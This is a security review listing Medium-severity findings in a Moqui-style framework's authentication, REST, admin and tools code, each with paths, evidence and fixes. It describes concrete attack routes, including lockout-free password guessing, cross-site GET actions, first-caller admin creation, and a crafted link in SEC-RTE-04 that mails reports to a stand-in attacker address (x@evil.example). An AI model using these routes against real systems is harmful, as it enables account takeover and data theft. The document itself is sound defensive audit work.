# Security review: Medium findings

The Medium findings of the [security review](Security-Review.md), by area. The register, its method, the status values and the coverage are there. Each as its reviewer wrote it. "Not confirmed" is what the reviewer did not trace; "Re-check" is the second reading, where there was one.

## Web authentication and controls

#### SEC-WEB-02. The password change form checks `oldPassword` with no lockout

Medium; confirmed (second check).

- **Where:** `runtime/components/base/framework/service/org/moqui/impl/UserServices.xml:166-283`; `Login.xml:105-114`; `ChangePassword.xml:19-23`
- **Reached by:** anonymous, `POST /Login/changePassword` or `/ChangePassword/changePassword` with `username` (or `userId`), `oldPassword`, `newPassword`, `newPasswordVerify`; a request with no session cookie needs no session token.
- **What happens:** The service counts a wrong `oldPassword` as a failed login but never reads `disabled` or `disabledDateTime`, so guessing goes on after the account locks, at the speed of argon2. A right guess changes the password and signs the caller in; for an account with a second factor the answer "Authentication code required for user" confirms the password. An unknown user returns before any hash is computed, so the response time tells whether a username exists (the same holds for `reset#Password`). The paths are also outside the `auth-failure` event (no `note_auth_failure`), and `/ChangePassword/**` is outside the `login` rate limit.
- **Evidence:** `UserServices.xml:237-238` `<if condition="!userAccount.get('currentPassword') || !ec.user.passwordsMatch(oldPassword, userAccount.get('currentPassword'), ...` with no `disabled` test between `:187` and here; `:254-256` `increment#UserAccountFailedLogins ... <return message="${passwordUpdatePublicMsg}" .../>`; `:267` `<return message="Authentication code required for user ${username}" public="true" error="true"/>`; `:198` `<if condition="userAccount == null"><return message="${passwordUpdatePublicMsg}" .../></if>`
- **Not confirmed:** not run; the tarpit has no seed rule for these transitions (`AgentTypeData.xml` rules are `AT_LLM` only), an operator's rule would slow it.
- **Suggested fix:** Put the account gate of `check_password_login` (disabled window, concurrency bound, `burn_verify` for an unknown user, `note_auth_failure`) in front of the `oldPassword` check, in Rust, and call it from `update#Password`.
- **Re-check:** read the service from its first action to the internal call; the only gate is "another signed-in user without `ADMIN_PASSWORD`". The tarpit is on for services and transitions but no seed rule covers these (`ArtifactTarpit` seed rows are `AT_LLM` groups only, plus the demo `ALL_SCREENS` rule). Each wrong guess also restarts the lock for the owner (C3).

#### SEC-WEB-03. A locked account stays locked while anything keeps trying, its own API key included

Medium; confirmed (second check).

- **Where:** `crates/moqui-core/src/user/login.rs:1303-1310`, `:449-470`, `:1736-1746`
- **Reached by:** anonymous who knows a username: four wrong passwords (`/Login/login`, `/rest/login`, Basic on any path), then one attempt in every five minutes; or four wrong passwords once, when the account's own integration sends its `api_key` more often than every five minutes.
- **What happens:** An attempt on a locked account is counted without checking the credential and rewrites `disabledDateTime`, so the window never ends while attempts continue. Key and app password logins pass through the same gate, so a valid key is refused during the lock and each of its requests extends the lock. The owner's password login is refused too; live cookie sessions go on. With per-client rules off (the default) nothing else limits it.
- **Evidence:** `login.rs:468` `if let Err(err) = gate_account(&facade, &account, now) { return (None, Err(err)); }` (in `internal_login`); `login.rs:1736-1746` (quoted in A6); `UserServices.xml:157` `refresh disabledDateTime even when already disabled so the window restarts`
- **Not confirmed:** not run.
- **Suggested fix:** Do not restart the window on attempts made while the account is locked, and do not count a valid key or app password presented during a lock as a failed login.
- **Re-check:** `check_login_key` and `check_app_password` reach `recorded_login` only for a valid, unexpired credential, and `recorded_login` calls `internal_login`, so the count is of valid credentials. No exemption found.

#### SEC-WEB-04. Transitions with the default method run their actions on a GET with no token

Medium; confirmed (lead).

- **Where:** `crates/moqui-core/src/screen/render.rs:2667-2672`, `:2070-2098`; `crates/moqui-core/src/screen/definition.rs:383-387`; `crates/moqui-core/src/user/session.rs:3002`
- **Reached by:** another site that makes a signed-in user's browser navigate (a link, a redirect, `window.open`) to a transition URL with no query string; the `SameSite=Lax` cookie is sent on a top-level `GET`.
- **What happens:** The rule is in A1. A writing transition that needs no parameter, takes its parameter as a `path-parameter`, or reads its input from the session runs for the victim. `GET /Login/logout` and `GET /rest/logout` are two: each signs the session out and sets `hasLoggedOut`, which signs out the user's other sessions at their next request. The other affected transitions are another slice's list.
- **Evidence:** `render.rs:2668` (quoted in A1); `Login.xml:77` `<transition name="logout">`; `rest.xml:101` `<transition name="logout" begin-transaction="false">`; `session.rs:3002` `let mut out = String::from("; HttpOnly; SameSite=Lax; Path=/");`
- **Not confirmed:** which writing transitions in the applications take no query parameter was not listed here. A `GET` with a body is not refused by `insecure_transition`, but a browser cannot send one.
- **Suggested fix:** Refuse a transition that runs actions and is not `read-only` unless the method is `POST`, `PUT`, `PATCH` or `DELETE` (or make `post` the default method for such transitions, as the implicit ones already are), and check `Sec-Fetch-Site` or `Origin` on every request with a session cookie.
- **Re-check:** Read `csrf_rejected`, `insecure_transition` and `runs_actions` in `crates/moqui-core/src/screen/render.rs`: the token is checked on POST, PUT, PATCH and DELETE only; a transition with actions that is not `read-only` is refused URL parameters but runs on a GET with none; a `read-only` transition is exempt from the URL-parameter rule, and its GET is not token-checked either. looked for a method test elsewhere on the path (`run_transition`, `screen/mod.rs`, a `Sec-Fetch-Site` grep over `moqui-core` and `moqui-host`); none. The `Origin` check passes a request with no `Origin`, which a top-level navigation is. Which application transitions are affected was not listed.

#### SEC-WEB-08. The first caller creates the administrator

Medium; confirmed (second check).

- **Where:** `Login.xml:116-120`; `UserServices.xml:487-505`
- **Reached by:** anonymous, one `POST /Login/createInitialAdminAccount` from any address, from the moment the listener binds until an account exists.
- **What happens:** The service checks only that no account exists but the seed ones. The listener binds `0.0.0.0` by default, so on a new install anyone who reaches the port before the operator does becomes a member of `ADMIN`. Two requests at once can both pass the check and both get an `ADMIN` account.
- **Evidence:** `UserServices.xml:498-503` (quoted in A9); `crates/moqui-host/src/lib.rs:1589-1590` `let ip = if host.trim().is_empty() { std::net::IpAddr::V4(std::net::Ipv4Addr::UNSPECIFIED)`
- **Not confirmed:** whether an install path (a setup command, seed data) creates an administrator before the listener starts was not traced.
- **Suggested fix:** Take the first administrator only from loopback, or with a setup secret printed in the startup log; take a row lock or a unique marker row so only one create passes.
- **Re-check:** looked for another creator of the first account: `grep InitialAdmin crates/` finds only the terminal dialog's two calls; `docs/Run-Deploy.md` tells the operator to open `/Login` and use the form. No loopback test, no setup secret.

## Routes, screens and REST

#### SEC-RTE-02. `GET <screen>/actions` answers the screen's whole context

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-core/src/screen/statics.rs:767` (`screen_package`), `:545` (`unwrap_context`); `crates/moqui-core/src/screen/definition.rs:1030`
- **Reached by:** any caller who may run a transition of the screen: anonymous for a screen that does not require authentication (`GET /Login/actions`), a signed-in user for a screen they may view.
- **What happens:** Every screen has an `actions` transition, whether or not it is a server-static qvt screen. It runs the screen's actions and sends every name in the context as JSON. Only thirteen credential names are removed. Anything a screen's actions put in the context for a check, and never show, is in the answer. For `/Login/actions` an anonymous caller gets the `AuthFlow` rows (`defaultUserGroupId`, `testedByUserId`, `systemMessageRemoteId`) and, where the demo row exists, the `EX_JOHN_DOE` `UserAccount` row without its password fields.
- **Evidence:** `crates/moqui-core/src/screen/statics.rs:768` `prepare_screen(state, def)?; let mut package = unwrap_context();` and `:814` `web::strip_credential_parameters(&mut body);`
- **Evidence:** `crates/moqui-core/src/screen/render.rs:1951` `super::Implicit::Actions => { in_transaction(transition.begin_transaction, None, || { super::statics::run_actions_transition(state) })?;` (no check of the screen's render modes or `server-static`)
- **Evidence:** `webroot/screen/webroot/Login.xml:164` `authFlowList = ec.entity.find("moqui.security.sso.AuthFlow").disableAuthz().orderBy("sequenceNum").list()` and `:191` (the `testUserAccount` find)
- **Evidence:** `crates/moqui-core/src/web/mod.rs:2330` `pub const CREDENTIAL_PARAMETER_NAMES: [&str; 13] = ["password", "oldpassword", ...];` (no `sharedSecret`, `loginKey`, `factorOption`, token or key names)
- **Not confirmed:** which application screens hold a secret in their context; that is each application slice's to check with this in mind. No test of `/Login/actions` was run.
- **Suggested fix:** Serve `actions` only for a screen that is eligible as a static template, and send only the names its template reads, or an allow-list the screen declares.

#### SEC-RTE-03. Any signed-in user can write `EntityAuditLog` rows through entity REST

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-entity/src/entity/query_rest.rs:214`; `runtime/components/base/framework/entity/EntityEntities.xml:21`
- **Reached by:** any signed-in user (a session with its token, a key or Basic), `POST /rest/e1/moqui.entity.EntityAuditLog` with any field values.
- **What happens:** The entity has `authorize-skip="create"`, the implicit `create#` service needs no service authorization, and the generic REST write refusal lists do not name the entity (a test asserts it is not an audit entity). A user with no grant at all can add rows saying any user changed any field of any record at any time. The audit log is the evidence the map's Admin section relies on.
- **Evidence:** `runtime/components/base/framework/entity/EntityEntities.xml:21` `authorize-skip="create"`
- **Evidence:** `crates/moqui-entity/src/entity/value.rs:2024` `list => matches!(action, "create" | "view") && list.split(',').any(|part| part.trim() == action),`
- **Evidence:** `crates/moqui-entity/src/entity/sensitive.rs:370` `assert!(!is_audit_entity("moqui.entity.EntityAuditLog"));`
- **Evidence:** `crates/moqui-entity/src/entity/field_rw.rs:471` `crate::hooks::call(&format!("create#{AUDIT_ENTITY}"), &row, true)?;` (the framework's own write already runs with authorization off, so the skip is not needed for it)
- **Not confirmed:** not run; a service ECA rule on the create that would refuse it was not looked for. The same create is reachable from any screen transition that takes an entity-auto service name from its own definition only, so REST is the one generic way found.
- **Suggested fix:** Remove `authorize-skip="create"` from `EntityAuditLog` and add it to the entities generic REST and the generic tools never write.

#### SEC-RTE-04. `emailScreenAsync` mails a full report to a request-given address by `GET`

Medium; reported (confirmed in code).

- **Where:** `runtime/components/base/webroot/template/screen/BasicTransitions.xml:20`
- **Reached by:** a signed-in user who may view one of the including screens and follows a link such as `/apps/.../FindTransactionEntry/emailScreenAsync?toAddresses=x@evil.example&screenRenderMode=csv`.
- **What happens:** The transition is `read-only`, so it takes its parameters from the URL and a `GET` is never token-checked; the session cookie is `SameSite=Lax`, which a cross-site top-level navigation carries. The service renders the including screen with `pageNoLimit=true` as the victim and mails it to `toAddresses`. `emailTemplateId`, `ccAddresses` and `bccAddresses` also come from the request.
- **Evidence:** `webroot/template/screen/BasicTransitions.xml:20` `<transition name="emailScreenAsync" read-only="true">` and `:22` `in-map="Object.assign({}, context, {screenLocation: ..., bodyParameters: ec.web.requestParameters})"`
- **Evidence:** `crates/moqui-core/src/screen/render.rs:2668` (only `post|put|patch|delete` are token-checked)
- **Evidence:** `runtime/components/base/framework/service/org/moqui/mail/EmailServices.xml:248` `<parameter name="toAddresses" required="true">` and `:252` `<parameter name="emailTemplateId" default-value="SCREEN_RENDER"/>`
- **Not confirmed:** the authorization of `send#ScreenRenderEmail` for a non-admin user (the screen's inheritable grant would have to cover it); a mail-side restriction on recipients was not looked for.
- **Suggested fix:** Make both transitions `method="post"` and not `read-only`, and take `emailTemplateId` from the transition, not the request.

#### SEC-RTE-05. `/resources` runs elFinder write commands on a `GET`

Medium; reported (confirmed in code).

- **Where:** `runtime/components/base/webroot/screen/webroot.xml:257`; `crates/moqui-dav/src/elfinder.rs:760`
- **Reached by:** a signed-in `ADMIN` who follows a crafted link (`/resources?resourceRoot=...&cmd=put&target=...&content=...`, or `cmd=rm`, `rename`, `mkdir`, `mkfile`).
- **What happens:** The transition is `read-only` with no `method`, so a `GET` with URL parameters runs any command and no session token is asked. The root comes from the request (`component://`, `file:` and others). In production writes go only to `dbresource://`, `content://` and `git://` roots; on any other instance purpose they go to every root, a component's scripts and screens included.
- **Evidence:** `webroot/screen/webroot.xml:257` `<transition name="resources" read-only="true">` and `:261` `const root = resourceRoot || ec.user.getPreference('mantle.content.root') || 'dbresource://mantle/content'`
- **Evidence:** `crates/moqui-dav/src/elfinder.rs:760` `"put" => 'put: { if write_refused(&mut response) { break 'put; } ... self.put_bytes(&entry, other_text("content").as_bytes())?;`
- **Evidence:** `crates/moqui-dav/src/elfinder.rs:781` `production && !(resource_root.starts_with("dbresource://") || resource_root.starts_with("content://") || resource_root.starts_with("git://"))`
- **Evidence:** `grep -n 'method' crates/moqui-dav/src/elfinder.rs` finds no check of the request method.
- **Not confirmed:** `run_command` lines 600-755 were skimmed, not read line by line.
- **Suggested fix:** Refuse every command but `open`, `tree`, `parents`, `ls`, `file` and `get` unless the request is a `POST` with the session token (split the transition in two).

#### SEC-RTE-06. Entity REST dependents read entities the restricted rule refuses

Medium; reported (likely).

- **Where:** `crates/moqui-entity/src/entity/query_rest.rs:208`, `:962` (`related_rows`)
- **Reached by:** a user with `AT_ENTITY` view on `UserAccount` and the related entities (in practice `ADMIN`, or a stolen admin key), `GET /rest/e1/moqui.security.UserAccount/<userId>?dependents=true`.
- **What happens:** The rule that keeps `UserLoginKey`, `UserAuthcFactor`, `UserPasswordHistory`, `UserGroupMember` and the others out of generic REST, an administrator included, is applied to the entity the path names. The dependents and master expansions read every related entity with a plain find. `UserAccount` has automatic reverse relationships to those entities, so the answer nests their rows; only the five `UserAccount` password field names are stripped, so `loginKey`, `factorOption` (decrypted) and `UserPasswordHistory.password` stay.
- **Evidence:** `crates/moqui-entity/src/entity/query_rest.rs:208` `if sensitive::is_restricted_entity_or_view(facade, &full_name) {` (target only)
- **Evidence:** `crates/moqui-entity/src/entity/query_rest.rs:970` `let mut find = facade.find(&target.full_name)?;` (no restricted check in `related_rows`, `push_related` or `render`)
- **Evidence:** `runtime/components/base/framework/entity/SecurityEntities.xml` `UserLoginKey`: `<relationship type="one" related="moqui.security.UserAccount" short-alias="user"/>`; `UserAuthcFactor`: `<field name="factorOption" type="text-medium" encrypt="true">`
- **Evidence:** `crates/moqui-db/src/model/mod.rs:1226` `is_auto_reverse: true,` (a reverse relationship is added on the target of every relationship)
- **Not confirmed:** not run; that `ADMIN` holds `AT_ENTITY` view on each related entity; that an encrypted field is returned decrypted by this path.
- **Suggested fix:** Skip a related entity that `is_restricted_entity_or_view` in `push_related`, and apply `secret_fields` to each nested entity.

#### SEC-RTE-07. A multipart body is spooled to disk before any check

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-host/src/http.rs:1109`-`1124`, `:1203`
- **Reached by:** anonymous, a `multipart/form-data` `POST` to any path.
- **What happens:** The host reads and spools up to `webapp_max_upload` (2 GiB by default) under the runtime directory before the request is queued, signed in or matched to a screen. Several such requests at once fill the runtime disk and hold its I/O; only the 60 s idle timeout and the body limit bound each one.
- **Evidence:** `crates/moqui-host/src/http.rs:1121` `match read_multipart(&state, body, limit, &content_type).await {` and `:1217` `let spool = Spool::under(state.factory.runtime_dir());`
- **Evidence:** `runtime/components/base/framework/conf/MoquiDefaultConf.xml:79` `<default-property name="webapp_max_upload" value="2147483648"/>`
- **Not confirmed:** what the edge guard and per-client web protection limit here when they are on (the map says the rules are on when `trusted-proxies` is set or `enabled="true"`); whether spooled files of a refused request are removed at once (`ReleaseAtEnd` in `screen/mod.rs:213` covers a request that reached `serve_at_to`).
- **Suggested fix:** Hold an anonymous multipart body to `webapp_max_body` unless the path is one that takes uploads without a user, and cap the spool directory's total size.

## Administration, identity and sign-in

#### SEC-ADM-02. `update#Password` tests passwords with no lockout and tells right from wrong

Medium; reported (confirmed in code).

- **Where:** `UserServices.xml:233-271`
- **Reached by:** anonymous, `POST /ChangePassword/changePassword` (or `/Login/changePassword`) with any `username`.
- **What happens:** The old password is compared whatever `disabled` and `successiveFailedLogins` say; a wrong one only increments the counter (and keeps the owner locked out). The answers differ: wrong is "Password could not be updated with the information provided."; right with a deliberately invalid new password is a policy message ("Password shorter than 8 characters") and nothing changes; right on an account with a second factor is "Authentication code required for user X". So the three-failure lockout of the login form does not bound guesses made here. `/ChangePassword/**` is not in the `login` rate limit, which is off anyway until per-client rules are on (old line 260).
- **Evidence:** `UserServices.xml:237` `<if condition="!userAccount.get('currentPassword') || !ec.user.passwordsMatch(oldPassword, ...">`; `:254-256` `increment#UserAccountFailedLogins ... <return message="${passwordUpdatePublicMsg}"`; `:267` `<return message="Authentication code required for user ${username}" public="true" error="true"/>`; `:313`; `base/framework/conf/MoquiDefaultConf.xml:869`
- **Not confirmed:** the `all` rate limit (50 a second) and any tarpit on the transition were not traced; argon2 cost per guess not measured.
- **Suggested fix:** Apply the login gate (`gate_account`, and the one-at-a-time `LoginCheck`) before the old password is compared, answer one message for every failure, and add `/ChangePassword/**` to the `login` limit.

#### SEC-ADM-03. A signed-in session changes the password without the old one

Medium; reported (confirmed in code).

- **Where:** `UserServices.xml:210-229` with `:704-738` (`create#SingleUseAuthcCodes`); mr-boss `screen/Commons/Settings/Account.xml:110-124`
- **Reached by:** whoever holds a signed-in session (a stolen cookie, an unlocked browser): post `createUserAuthcFactorSingleUse`, read the codes, post `changePassword` with one code and any text as `oldPassword`.
- **What happens:** Issuing single-use codes needs no password and no recent sign-in. Having any factor in date makes `secondFactorRequired` true, and for the signed-in user (`codeUsername == username`) a valid code sets `codeVerified`, which skips the old password. The same session can also end the user's factors (`invalidate#UserAuthcFactorEntry`) and mint an access token (C7). The recent sign-in check (`check#RecentAuth`) guards none of these.
- **Evidence:** `UserServices.xml:221-227` `<set field="codeUsername" from="ec.web?.sessionAttributes?.moquiPreAuthcUsername || ec.user.username"/> <if condition="codeUsername && codeUsername == username"> ... <set field="codeVerified" from="true"/>`; `:233` `<if condition="!codeVerified">`; `:603-611`; mr-boss `Account.xml:119-121` `create#SingleUseAuthcCodes" in-map="{userId:ec.user.userId, thruDate:thruDate, numberOfCodes:numberOfCodes}"`
- **Not confirmed:** not run; how the codes kept in the session are shown was not read.
- **Suggested fix:** Let a code replace the old password only for a pre-authenticated session (password already checked), never for a signed-in one; require `check#RecentAuth` for issuing codes, adding or ending a factor and creating keys.

#### SEC-ADM-04. Factor services act on any `userId`

Medium; reported (to check).

- **Where:** `UserServices.xml:532, 637, 704, 741, 815, 932, 963, 990, 1008, 1052`
- **Reached by:** a user of any screen whose transition passes request parameters to these services; mr-marble `screen/MyAccount/User/Account.xml:29-42` calls them with no `in-map` (the screen's always-actions set `userId` from `ec.user.userId`; which wins over a posted `userId` was not traced) and mounts the tools `Verify*` subscreens, whose `sendAuthcCodeEmail` takes a posted `factorId`.
- **What happens:** None of the services compares `userId` or the factor's owner with the caller, so the wall is each screen's parameter handling. With another user's id a caller would issue recovery codes for them, end their factors, or read a TOTP secret (`setup#UserAuthcFactorTotp` with `factorId`).
- **Evidence:** `UserServices.xml:1052-1057` `<service verb="invalidate" noun="UserAuthcFactorEntry"> ... <parameter name="factorId" required="true"/> <parameter name="userId" required="true"/>` (no check follows); `:1035-1045`
- **Not confirmed:** the order of always-actions and request parameters in a transition's implicit `in-map`; whether `MY_ACCOUNT` users reach these transitions.
- **Suggested fix:** In each service refuse a `userId` that is not the caller's unless the caller holds `ADMIN_IDENTITY_MANAGE` (with `heldBeyond`), and never return a stored TOTP secret once the factor is verified.

#### SEC-ADM-05. `ADMIN` reaches the sealed permissions of `ADMIN_ADV` through another account

Medium; reported (confirmed in code).

- **Where:** `UserServices.xml:183-202`; `base/tools/screen/System/Security/UserAccount/UserAccountDetail.xml:23, 54-64`
- **Reached by:** a member of `ADMIN` (holds `ADMIN_PASSWORD`, not `SSH_SHELL`, `SQL_RUNNER_WEB`, `TERMINAL_HOST`, `COMPONENT_DEPLOY`, `CONF_EDIT`, `ADMIN_LOGIN_AS`), on System › Security › User Accounts.
- **What happens:** With `ADMIN_PASSWORD` `update#Password` sets any account's password with no further check, and the same screen issues single-use codes for, or ends the factors of, any account. So an `ADMIN` member sets the password of an `ADMIN_ADV` member, issues a code and signs in as them. The `heldBeyond` rule that `IdentityServices` applies to sessions and credentials is not applied here. The seal on those permissions holds against a grant, not against taking over a holder.
- **Evidence:** `UserServices.xml:202` `<if condition="!hasPwAdminPermission">` (every check is inside it); `base/framework/data/SecurityTypeData.xml:71` `UserGroupPermission userGroupId="ADMIN" userPermissionId="ADMIN_PASSWORD"`; `:172-176` `ADMIN_ADV` grants; `UserAccountDetail.xml:56-57`
- **Not confirmed:** other `ADMIN` routes to the same end (an entity edit of `UserAccount.currentPassword` or a `UserLoginKey` row in Tools) were not traced; if they exist this adds little.
- **Suggested fix:** Apply `heldBeyond` in `update#Password` (admin path), `update#UserAccount` and the factor services when the target is another account.

#### SEC-ADM-06. `ADMIN_IDENTITY_MANAGE` assigns bundles though it is not sealed

Medium; reported (likely).

- **Where:** `admin/Access.js:1093-1120` (`applyGrantProposal`)
- **Reached by:** a holder of `ADMIN_IDENTITY_MANAGE` without `ADMIN_ACCESS_MANAGE` (mr-boss `BOSS_ADMIN_IDENTITY`), through whatever screen or service calls `AccessServices.apply#GrantProposal` (Mantle's `Identity.js:631`, `SharedDevices.js:102`, `Lifecycle.js:454`).
- **What happens:** `ADMIN_ACCESS_MANAGE` is sealed because it widens access, yet `apply#GrantProposal` writes the same memberships for a holder of the unsealed `ADMIN_IDENTITY_MANAGE`, for any `userId`, the caller's own included. The only bounds are `proposalBundles` (registered, not privileged for a non-member, no sealed permission carried, the bundle's `delegablePermissionId`), and none of the 150 `CapabilityBundle` rows under `runtime/components/addon` names a `delegablePermissionId`. An identity operator could so join `BOSS_ADMIN_CONFIGURE`, `BOSS_ADMIN_INTEGRATIONS`, `BOSS_ADMIN_OPERATIONS`, `BOSS_ADMIN_DATA` or any application's administrator bundle.
- **Evidence:** `admin/Access.js:1095-1096` `if (!ec.user.hasPermission(MANAGE) && !ec.user.hasPermission("ADMIN_IDENTITY_MANAGE")) throw new Error(...)`; `:1098` `const account = text(p.userId) ? one("moqui.security.UserAccount", {userId: text(p.userId)}) : null`; `:106-108` `delegable`; `grep -c delegablePermissionId` over the addon bundle rows: 0
- **Not confirmed:** whether Mantle's callers let the operator name their own account or an account outside their organization (not read: Mantle slice); which of those bundles carry a sealed permission.
- **Suggested fix:** Refuse the caller's own account in `apply#GrantProposal` for a caller without `ADMIN_ACCESS_MANAGE`, and give administrative bundles a `delegablePermissionId`.

## Tools, System, Monitor and Dashboards

#### SEC-TLS-03. `runTokenCommand` is on `ec.resource` for every script

Medium; reported (confirmed in code).

- **Where:** `crates/moqui-core/src/script/host/tools.rs:721`, `:1272`, `:2602-2621`
- **Reached by:** any place that runs script text a user supplies: C1's `filterMap`, C2's templates, an ETL `expression` (with `GROOVY_SHELL_WEB`), and whatever other slices find (stored filter maps, templates).
- **What happens:** The function has one caller in the repository (`init#InstanceDocker`) but is installed on the shared tools shim, so a script-injection anywhere becomes process execution as the server's OS user. Its only check is the read fence. The argument is split on white space, so `sh -c` with a one-word script, or any program with plain arguments, runs.
- **Evidence:** `tools.rs:2610-2615` `let mut words = command.split_whitespace(); let Some(program) = words.next() ... crate::entity::fence::check_effect(crate::entity::fence::Effect::Process, program)?; let mut child = Command::new(program).args(words)`
- **Evidence:** `grep -rn runTokenCommand runtime/components/base` gives one use, `InstanceServices.xml:447`
- **Not confirmed:** whether a browser-side or sandboxed script host (the widget wrapper, a load script's user threads) also has it; the map says a load script's threads have no `ec`.
- **Suggested fix:** Make it a native service step of `init#InstanceDocker` (Rust), with the command read from the conf, and take it off the script host.

#### SEC-TLS-04. State-changing transitions that run on a cross-site GET

Medium; confirmed (lead).

- **Where:** `crates/moqui-core/src/screen/definition.rs:387`, `render.rs:2076-2099`, `:2668-2673`; the transitions below
- **Reached by:** a signed-in holder of the screen who follows a link (or loads an image URL that the browser sends with the Lax cookie only on top-level navigation, so a link or redirect) to the transition's URL with no query string.
- **What happens:** A default-method transition with actions is refused only when the URL carries parameters. One that needs none runs on a GET with no token. In this slice: `System/Cache/CacheList/clearAllCaches` and `clearArtifactCaches`; `System/Conf/Changes/reloadConf` and `restartServer` (a dev instance restarts); `System/EdgeNode/Status/unpair` and `unpairFront` (the edge pairing is revoked and removed from `runtime/.env`), `drainSelf` (`drain` defaults to true: `/health` answers 503); `System/EdgeClients/Domains/recheckConflicts`; `System/Monitor/Settings/revertAll`; `System/Llm/Usage/rollupUsage`, `System/Llm/Skills/SkillList/syncSkills`; `System/Print/Printer/PrinterList/getServerPrinters`; `System/Integrations/SystemMessages/sendAllMessages` and `consumeAllMessages`; `Tools/Data/Snapshots/exportSnapshot` (starts an export of every entity to a zip under `runtime/db/snapshot`). `runBackup` is not one: `run#Backup` requires `reason`.
- **Evidence:** `System/Cache/CacheList.xml:40-42` `<transition name="clearAllCaches" authz-action="update">` ... `ec.cache.clearAllCaches()`
- **Evidence:** `System/EdgeNode/Status.xml:67-68` `<transition name="unpair"><service-call name="org.moqui.edge.EdgeServices.unpair#EdgeNode"/>`; `framework/service/org/moqui/edge/EdgeServices.xml:177-183` its one parameter is `front` with `default-value="false"`
- **Evidence:** `System/EdgeNode/Status.xml:58-59` `drainSelf` with `in-map="{drain:drain}"`; `EdgeServices.xml:341-343` `<parameter name="drain" type="Boolean" default-value="true"/>`
- **Evidence:** `System/Conf/Changes.xml:25-26`, `:33-34` `reloadConf`, `restartServer`; `Tools/Data/Snapshots.xml:19-28`
- **Evidence:** `render.rs:2095-2098` the refusal needs `query || !inline_parameters.is_empty()`
- **Not confirmed:** not run. The services' own refusals when called with nothing (`unpair#EdgeNode`, `revert#AllRuntimeSettings`, `recheck#ReplicaConflicts`) were read only in their definitions. Transitions of other slices' screens were not listed. Whether an explicit null passed by `in-map="{drain:drain}"` keeps the default was not traced.
- **Suggested fix:** Make the default method of a transition that runs actions and is not read-only `post` (the framework), or refuse a GET for it. Until then give these transitions `method="post"`.
- **Re-check:** The rule is as read for SEC-WEB-04; the listed transitions were not read one by one.

#### SEC-TLS-05. Export and Snapshots read the entities the other generic tools refuse

Medium; reported (likely).

- **Where:** `runtime/components/base/tools/screen/Tools/Data/Export.xml:26-45`; `Tools/Data/Browse/AutoEdit/AutoEditMaster.xml:31-34`; `crates/moqui-entity/src/entity/data_writer.rs:410-432`
- **Reached by:** a user with update on the Tools app: `EntityExport` with `entityNames=moqui.security.UserAccount` (or `UserLoginKey`, `UserAuthcFactor`, `moqui.basic.email.EmailServer`, `moqui.database.DatabaseConnection`, `moqui.server.instance.DatabaseHost`), `output=browser`; or `AutoEditMaster/export?aen=<entity>&<pk>`.
- **What happens:** The grid, Browse, Record, ETL and REST refuse the identity, secret-config and audit entities and strip the `UserAccount` password fields. The data writer does neither, so password hashes and salts, login-key hashes, sign-in factor rows and the stored credentials of mail servers and external databases leave in one download. The map accepts that Tools reads "every record whole" for business records; it says the audit entities are read only by their own services (B1), and external database passwords are "never returned".
- **Evidence:** `Export.xml:35-39` `for (const entityName of entityNames) { const entDef = ec.entity.getEntityDefinition(entityName) ... } edw.entityNames(entityNames)`
- **Evidence:** `AutoEditMaster.xml:27` the `update` transition checks `WebUtilities.isRestrictedGenericEntity(aen)`; the `export` transition at `:31-46` does not, and the parent's check (`Browse/AutoEdit.xml:22`) is in `<actions>`, which a transition does not run
- **Evidence:** `data_writer.rs:423` `let mut find = self.facade.find(&full_name)?;` (no `sensitive` call in the file); compare `crates/moqui-tools/src/grid.rs:287` `if sensitive::is_restricted_entity_or_view(facade, entity_name)` and `:390` `sensitive::secret_fields`
- **Not confirmed:** whether a find on an `encrypt="true"` field returns the clear value to the writer (not traced), and whether an entity-level rule refuses the audit entities to a find outside `sensitive` (none found by grep).
- **Suggested fix:** Have `EntityDataWriter` refuse `is_restricted_entity_or_view` entities and drop `secret_fields` unless a sealed permission (for a full backup snapshot) is held.

#### SEC-TLS-06. A scheduled report writes to any server path

Medium; reported (likely).

- **Where:** `crates/moqui-report/src/schedule.rs:75-76`, `:1370-1392`; `crates/moqui-core/src/context/resource.rs:528-545`
- **Reached by:** a holder of `REPORT_SAVE_LOCATION` (seeded on `ADMIN`; not a sealed permission) who saves a schedule with `saveToLocation` set, for example to `file:/…`, `runtime://conf/…` or `component://…`.
- **What happens:** At each run the rendered file replaces whatever is at that location, with parent directories made. The content is a report the author composes (titles, a CSV's header and cells), so the write can destroy a file the server needs or place text where the server later reads it (a component's `data/`, a `.env`, a template). The conf edit is behind sealed `CONF_EDIT` "since the conf names the code the server runs"; this path is not.
- **Evidence:** `schedule.rs:1386-1387` `let target = file_location(location, name, rendered.files.len()); match context.factory().resource().write_bytes(&target, bytes)`
- **Evidence:** `resource.rs:540-545` `let path = self.writable_path(location)?; ... std::fs::create_dir_all(parent) ...; std::fs::write(&path, bytes)`; `:1008` accepts `"file" | "runtime" | "component"`
- **Not confirmed:** how much of a rendered CSV or HTML file an author controls byte for byte (so whether a parsed file such as a conf or a `.env` can be forged) was not worked out; `store#Schedule` in `delivery.rs` (the business path) was not read for a second check. The map's phrase is "configured server resource locations"; no configured list was found.
- **Suggested fix:** Hold `saveToLocation` to roots named in the conf (`report` `save-roots`), refuse `..`, `component://` and the conf and `.env` paths, and make the permission sealed.

#### SEC-TLS-11. (telemetry reader) Monitor's permissions are checked only in its services; a generic write to a `moqui.monitor` row goes around them

Medium; reported (likely).

- **Where:** `crates/moqui-report/src/recovery/mod.rs:485-492`, `crates/moqui-report/src/recovery/execute.rs:526` and `:176-199`, `crates/moqui-entity/src/entity/sensitive.rs:66-76`
- **Reached by:** a user who can write entities generically but lacks the `MONITOR_*` permission: Tools › Data (Record, Grid, Browse: `update#${entity}` under `TOOLS_APP`'s inherited authorization), Data Load, or Tools' SQL with changes.
- **What happens:** `run#Recovery` (each minute, authorization off) takes every `RecoveryAction` row whose status is `Persisted`, `Running` or `AwaitingOperator` and runs its adapter for the row's `action`, `target` and `adapterId`. It reads no decision, no approval, no emergency stop and no `allow-automatic` at that point, so a row created directly (with a `MonitorIncident` row for its `incidentId`) pauses a job, writes an `ALL_USERS` deny on an artifact group, drains an instance or posts a webhook within a minute. The same holds for `RecoveryAdapter` and `RecoveryPolicy` (gate `MONITOR_RECOVER_ADMIN`), `RecoveryControl` (the emergency stop), `InstanceDrain`, and `IngestKey`: a row with a chosen `keyId` (the SHA-256 of a chosen token) and the `userId` of a `MONITOR_INGEST` holder is a working ingest key. None of these entities is in the lists the generic tools refuse.
